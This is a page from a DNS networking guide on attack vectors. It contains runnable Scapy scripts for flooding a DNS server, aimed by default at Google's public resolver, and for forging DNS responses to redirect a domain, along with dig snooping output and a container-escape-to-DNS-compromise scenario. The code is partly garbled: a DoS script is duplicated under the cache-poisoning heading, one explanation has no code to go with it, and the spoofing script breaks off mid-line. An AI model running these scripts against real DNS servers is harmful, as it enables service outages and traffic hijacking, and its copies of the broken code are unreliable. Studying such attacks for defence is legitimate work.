

 | [main](https://ji-podhead.github.io/Network-Guides) | [DNS](https://ji-podhead.github.io/Network-Guides/DNS) | [Repo](https://github.com/ji-podhead/Network-Guides/) |

---

## DNS
 | [Knowledge Base](https://ji-podhead.github.io/Network-Guides/DNS/Knowledge%20Base)| [Install](https://ji-podhead.github.io/Network-Guides/DNS/install) | [Test&Debug](https://ji-podhead.github.io/Network-Guides/DNS/testAndDebug) | [Attack Vectors & Scenario](https://ji-podhead.github.io/Network-Guides/DNS/attackVectorsAndScenario) | [Protection](https://ji-podhead.github.io/Network-Guides/DNS/protection) | 

# Attack Vectors & Scenario
## Attack Vectors
### Snooping
- we can get the ip's of the clients  that send DNS-requests to the server
  - this is because the dns stores/caches the ips of the clients for the reverse request to speed up the connection-process
```bash
$ dig +norecurse @192.168.122.7 foreman.de
```
>```yaml
>; <<>> DiG 9.16.23-RH <<>> +norecurse @192.168.122.7 foreman.de
>; (1 server found)
>;; global options: +cmd
>;; Got answer:
>;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17547
>;; flags: qr aa; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
>
>;; OPT PSEUDOSECTION:
>; EDNS: version: 0, flags:; udp: 1232
>; COOKIE: 05a3b545adc9f83701000000666323381697775d93001fbd (good)
>;; QUESTION SECTION:
>;foreman.de.			IN	A
>
>;; ANSWER SECTION:
>foreman.de.		604800	IN	A	192.168.122.20
>
>;; AUTHORITY SECTION:
>foreman.de.		604800	IN	NS	bindserver.foreman.de.
>foreman.de.		604800	IN	NS	localhost.
>
>;; ADDITIONAL SECTION:
>bindserver.foreman.de.	604800	IN	A	192.168.122.20
>
>;; Query time: 1 msec
>;; SERVER: 192.168.122.7#53(192.168.122.7)
>;; WHEN: Fri Jun 07 17:11:52 CEST 2024
>;; MSG SIZE  rcvd: 147
 >```
> now we know that `localhost` made a DNS-request for `foreman.de`

---


> -   We construct a DNS query packet targeting `www.example.com`.
> -   We then create a DNS response packet that includes our spoofed source IP (`src_ip`) and the actual destination IP (`dst_ip`). The response packet is crafted to mimic a legitimate DNS response for `www.example.com`, directing it to an IP address (`1.3.3.7`) of the attacker's choice.
> -   Finally, we send the crafted DNS response packet towards the DNS server.

---
### Denial of Service Attack

```python
from scapy.all import *
import threading

# Target DNS Server
target_dns_server = "8.8.8.8"  # Example: Google's DNS Server

# Function to send a DNS query
def send_dns_request():
    # Create a DNS query for google.com
    dns_request = IP(dst=target_dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
    # Send the DNS query
    send(dns_request)

# Main logic: Generate a large number of threads, each sending a DNS query
if __name__ == "__main__":
    # Number of threads to run simultaneously
    num_threads = 500

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_dns_request)
        thread.start()
        threads.append(thread)

    # Wait until all threads are completed
    for thread in threads:
        thread.join()
    print("All threads completed.")

```
> - This Python script uses Scapy, a powerful packet manipulation program, to send DNS queries to a target DNS server.
> - The `target_dns_server` variable specifies the DNS server to which the queries will be sent. In this example, it's set to Google's public DNS server (`8.8.8.8`).
> - The `send_dns_request` function constructs a DNS query for `google.com` and sends it to the target DNS server.
> - The main part of the script creates and starts a specified number of threads (`num_threads`) that execute the `send_dns_request` function concurrently.
> - Each thread sends a DNS query, potentially overwhelming the target DNS server with a flood of requests.
> - After starting all threads, the script waits for all of them to finish executing with `thread.join()`.
> - Finally, it prints a message indicating that all threads have been completed.

### DNS Cache-Poisining
 DNS cache poisoning, is a malicious activity where an attacker injects false DNS records into a DNS server's cache. 
> - This manipulation tricks the DNS server into returning incorrect IP addresses for a domain name, redirecting users to malicious websites instead of legitimate ones.

- Attackers often target DNS servers that are not properly secured or configured, leading to successful redirection of traffic.
- there are 2 main tatics used:
---

***Sending a fake record using spoofed ip***

- attack an additional nameserver in order to respond to the targeted nameserver with a correct ip, but also with a ***fake record***
   -  a ***denial of service attack*** such as DDOS can be used to kill the additional nameserver to spoof it
   - server got taken over by any other hack and gets controlled directly

```python
from scapy.all import *
import threading

# Target DNS Server
target_dns_server = "192.168.22.7"  # Example: private DNS Server

# Function to send a DNS query
def send_dns_request():
    # Create a DNS query for google.com
    dns_request = IP(dst=target_dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
    # Send the DNS query
    send(dns_request)

# Main logic: Generate a large number of threads, each sending a DNS query
if __name__ == "__main__":
    # Number of threads to run simultaneously
    num_threads = 500

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_dns_request)
        thread.start()
        threads.append(thread)

    # Wait until all threads are completed
    for thread in threads:
        thread.join()

    print("All threads completed.")

```

---
***Sending a fake query by using IP-Spoofing***

- we will attack the victim directly instead of using an additional nameserver
 - a ***denial of service attack*** such as DDOS could be used to kill the corresponding DNS 
- the spoofed DNS sends a `fake query` directly to the victim 
-  the attcker will either:
   - sniff the web to get the Transaction-Number
   - use random Transaction-Number in brute-force-manier

![DNS-spoofing](https://github.com/ji-podhead/Network-Guides/blob/main/docs/DNS/attackVectorsAndScenario/dns-spoofing.png?raw=true)
```python
from scapy.all import send, IP, UDP, DNS, DNSQR, DNSRR
import random

# Target domain to be spoofed
target_domain = "foreman.de"
# IP address of the machine running the python code
attacker_ip = "192.168.1.100"  # Modify this according to your environment
# IP address of the victim client (DNS resolver)
victim_ip = "192.168.122.7"  # Modify this according to your environment

# DNS port
dns_port = 53

# Generate a random transaction ID
transaction_id = random.randint(0, 65535)

# Generate a fake DNS query
def generate_fake_dns_query(transaction_id):
    query = DNSQR(qname=target_domain, id=transaction_id)
    return query

# Spoof the DNS request and response
def spoof_dns_request_and_answer(transaction_id):
    # Create the DNS request with the specified transaction ID
    query_packet = IP(src=attacker_ip, dst=victim_ip) / UDP(sport=random.randint(1024, 65535), dport=dns_port) / DNS(id=transaction_id, rd=1, qd=DNSQR(qname=target_domain))

    # Create the fake DNS response
    answer = IP(dst=victim_ip, src=attacker_ip) / UDP(dport=dns_port, sport=random.randint(1024, 65535)) / DNS(id=transaction_id, aa=True, qr=True, an=DNSRR(name=target_domain, type='A', ttl=10, rdata='1.3.3.7'))

    # Send the fake DNS response
    send(answer)

# Start the DNS spoofing attack
spoof_dns_request_and_answer(transaction_id)

print(f"DNS spoofing
```

---

###  Possible Szenario

> Escaping a Web Application Container and Attacking a Private DNS Server

***Background***

-   A web application is running within a container in a Kubernetes (K8s) cluster.
-   The attacker has compromised the web application container and aims to escalate their privileges.

**Attack Steps**

1.  ***Container Escape:***

    -   The attacker identifies a vulnerability (e.g., misconfigured security settings, outdated software) within the web application container.
    -   They exploit this vulnerability to escape the container.
2.  ***Network Access:***

    -   Once outside the container, the attacker gains access to the underlying host system.
    -   They can now interact with the network interfaces (NICs) on the host.
3.  **Discovering DNS Servers:**

    -   The attacker scans the network to identify DNS servers.
    -   They may find a private DNS server used for internal services, such as dashboards or monitoring tools.
4.  **DNS Server Exploitation:**

    -   The attacker targets the private DNS server:
        -   If the DNS server is misconfigured (e.g., allows zone transfers), they can retrieve DNS records.
        -   They can manipulate DNS records (e.g., redirecting traffic to malicious IP addresses).
        -   If the DNS server has known vulnerabilities (e.g., outdated software), they can exploit them.
5.  **Impact of DNS Server Compromise:**

    -   By compromising the DNS server, the attacker can:
        -   Redirect legitimate users to malicious sites.
        -   Intercept sensitive data (e.g., login credentials) by modifying DNS responses.
        -   Disrupt internal services by altering DNS records.
